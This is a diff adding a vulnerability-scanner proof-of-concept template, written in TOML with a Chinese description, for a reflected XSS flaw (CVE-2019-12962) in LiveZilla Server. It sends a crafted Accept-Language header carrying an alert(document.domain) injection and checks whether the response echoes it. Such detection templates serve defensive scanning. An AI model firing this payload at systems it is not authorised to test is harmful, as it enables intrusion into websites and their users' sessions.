@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "向 LiveZilla Server 的 /mobile/index.php 发送带有恶意 Accept-Language 头的 GET 请求，验证响应体中是否回显了注入的 JavaScript 代码，确认反射型 XSS 漏洞存在。"
+id = "POC-AVE-2019-0057"
+name = "LiveZilla Server Accept-Language 反射型XSS PoC"
+severity = "medium"
+tags = ["ave-2019-0057"]
+vuln_id = [
+    "CVE-2019-12962",
+    "AVE-2019-0057",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/mobile/index.php"
+protocol = "http"
+
+[poc.requests.headers]
+Accept-Language = ";alert(document.domain)//"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["var detectedLanguage = ';alert(document.domain)//';"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
